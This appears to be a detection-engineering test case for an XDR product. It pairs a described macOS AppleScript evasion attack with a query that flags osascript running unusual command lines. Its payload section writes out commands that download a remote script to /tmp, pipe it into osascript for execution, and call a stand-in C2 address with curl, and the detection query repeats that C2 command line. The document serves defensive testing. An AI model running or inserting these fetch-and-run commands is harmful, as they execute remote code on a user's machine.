identity.description: An attacker executes an AppleScript process with a rare command line argument to evade detection. Cortex should detect this unusual behavior as a potential sign of malicious activity. The attack involves leveraging AppleScript to execute a remote payload via a test-net C2 channel.

payload.code:
wget -O /tmp/script.scpt https://example.com/payload.scpt

cat /tmp/script.scpt | osascript -l JavaScript

osascript -e 'do shell script "curl -s http://192.0.2.10:8080/attack"'

expected_artifacts.description: AppleScript process executed with unusual command line

biocs.name: AppleScript Process with Rare Command Line
biocs.description: Detection of osascript process with uncommon command line arguments indicating potential evasion
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'osascript'
| filter action_file_path contains 'script.scpt'
| filter action_command_line contains 'curl -s http://192.0.2.10:8080/attack'
